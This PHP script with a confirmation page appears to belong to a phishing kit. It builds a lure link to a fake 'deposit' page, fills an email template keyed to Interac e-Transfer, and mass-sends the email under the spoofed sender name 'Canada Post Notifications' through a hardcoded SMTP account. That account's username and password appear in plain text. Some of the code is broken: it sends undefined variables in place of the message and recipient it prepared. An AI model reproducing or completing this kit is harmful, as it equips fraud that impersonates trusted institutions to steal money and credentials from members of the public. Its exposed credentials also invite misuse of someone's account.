<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

session_start(); // Start a PHP session

function shortenURL($url) {
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

if (isset($_POST['submit'])) {
    // Generate the long URL
    $long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);

    // Shorten the long URL
    $short_url = shortenURL($long_url);

    // Calculate the date 30 days in the future and format it
    $expireDate = date('F d, Y', strtotime('+30 days'));

    // Create a placeholders array for replacement in the email template
    $placeholders = array(
        '{{etransfer_interac_ca}}' => $long_url,
        '{{receivers_email}}' => $_POST['receivers_email']
    );

    $message = file_get_contents('template.html');
    $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->SMTPSecure = 'tls';
        $mail->Host = 'mail.mts.net'; // Use the provided host
        $mail->Port = 587; // The common SMTP port for TLS
        $mail->Body = $emailMessage;
        $mail->SMTPAuth = true;
        $mail->Username = 'andallard@mymts.net'; // Use the email address as the username
        $mail->Password = 'Batman123'; // Use the provided password
        $mail->SetFrom('andallard@mymts.net', 'Canada Post Notifications'); // Set From name to "Canada Post"
        $mail->AddAddress($recipient);
        $mail->Subject = $_POST['email_subject'];
        $mail->IsHTML(true);
        $mail->CharSet = "utf-8";

    // Send the email
    if (!$mail->send()) {
        $_SESSION['message_sent'] = false; // Message could not be sent
    } else {
        $_SESSION['message_sent'] = true; // Message has been sent
    }

    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Sending Confirmation</title>
    <style>
        /* Global styles */
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        /* Container styles */
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #333;
            border: 2px solid #555;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        /* Heading styles */
        .heading {
            font-size: 24px;
            font-weight: bold;
            color: red;
            margin-top: 20px;
        }

        /* Message styles */
        .message {
            font-size: 18px;
            margin-top: 20px;
        }

        /* Button styles */
        .home-button {
            padding: 10px 20px;
            background-color: #FFD700;
            color: #333;
            text-decoration: none;
            font-size: 18px;
            margin-top: 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Heading -->
        <div class="heading">
            Email Sending Confirmation
        </div>

        <!-- Message -->
        <div class="message">
            <?php
                if (isset(
                $_SESSION['message_sent']) && $_SESSION['message_sent'] === true) {
                    echo "Emails have been sent successfully!";
                } else {
                    echo "Email sending failed. Please try again.";
                }
            ?>
        </div>

        <!-- Home button -->
        <a class="home-button" href="start.php">Back to Home</a>
    </div>
</body>
</html>
